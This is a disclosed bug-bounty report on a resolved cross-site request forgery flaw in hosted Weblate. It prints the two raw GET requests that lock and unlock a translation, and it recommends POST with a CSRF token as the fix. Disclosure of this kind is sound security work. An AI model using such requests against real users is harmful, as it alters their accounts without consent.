---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '223345'
original_report_id: '223345'
title: 'CSRF : Lock and Unlock Translation'
weakness: Cross-Site Request Forgery (CSRF)
team_handle: weblate
created_at: '2017-04-24T09:49:42.632Z'
disclosed_at: '2017-05-17T18:03:36.341Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 4
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# CSRF : Lock and Unlock Translation

## Metadata

- HackerOne Report ID: 223345
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: weblate
- Disclosed At: 2017-05-17T18:03:36.341Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**Description :**
Attacker can force to victim for Lock and Unlock Translation.

**That HTTP Request :**
```
GET /lock/aptoide-uploader/strings/ka/ HTTP/1.1
Host: hosted.weblate.org
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://hosted.weblate.org/
Accept-Encoding: gzip, deflate, sdch, br
Accept-Language: en-US,en;q=0.8
Cookie:  cookie_here
```
```
GET /unlock/aptoide-uploader/strings/ka/ HTTP/1.1
Host: hosted.weblate.org
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://hosted.weblate.org/
Accept-Encoding: gzip, deflate, sdch, br
Accept-Language: en-US,en;q=0.8
Cookie: cookie_here

```
**Fix :**
Make that Request POST , and add a CSRF token there.

Best Regards',
Jay Patel

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
